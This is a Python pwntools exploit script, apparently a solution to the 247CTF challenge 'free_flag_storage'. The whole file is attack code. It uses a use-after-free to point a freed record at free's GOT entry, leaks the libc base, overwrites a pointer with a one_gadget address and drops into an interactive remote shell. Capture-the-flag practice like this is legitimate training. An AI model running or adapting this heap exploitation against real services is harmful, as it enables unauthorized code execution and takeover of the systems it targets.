from sys import argv
from pwn import *

elf = ELF("free_flag_storage")
libc = ELF("libc-2.27.so")
host, port = argv[1].split(":")
r = remote(host, int(port))
banner = "-------------------------"
one_gadget = 0x3cbec


def view():
    r.recvuntil(banner)
    r.sendline("print")


def add(size, data, index, score):
    r.recvuntil(banner)
    r.sendline("add")
    r.recvline()
    r.recvuntil("length:")
    r.sendline(str(size))
    r.recvuntil("value:\n")
    r.sendline(data)
    r.recvuntil("challenge_id:")
    r.sendline(str(index))
    r.recvuntil("score:")
    r.sendline(str(score))


def edit(index, data, score):
    r.recvuntil(banner)
    r.sendline("edit")
    r.recvuntil("edit:\n")
    r.sendline(str(index))
    r.recvuntil("):\n")
    r.sendline(data)
    r.recvuntil("challenge_id:")
    r.sendline(str(index))
    r.recvuntil("score:")
    r.sendline(str(score))


def delete(index):
    r.recvuntil(banner)
    r.sendline("delete")
    r.recvuntil("delete:\n")
    r.sendline(str(index))


log.info("leaking libc_base...")
add(0x15, "A", 0, 1)
add(0x15, "B", 0, 1)
add(0x15, "C", 0, 1)

delete(0)

edit(0, p32(elf.got['free']) * 16, 1)
view()

r.recvuntil("247CTF{")
r.recvline()
r.recvuntil("247CTF{")
free = u32(r.recv(4))
log.success("free --> %s" % hex(free))
libc_base = free - libc.sym['free']
shell = libc_base + one_gadget

log.success("libc_base --> %s" % hex(libc_base))
log.info("libc_base leaked")

edit(1, p32(shell) * 2, 1)

r.interactive()
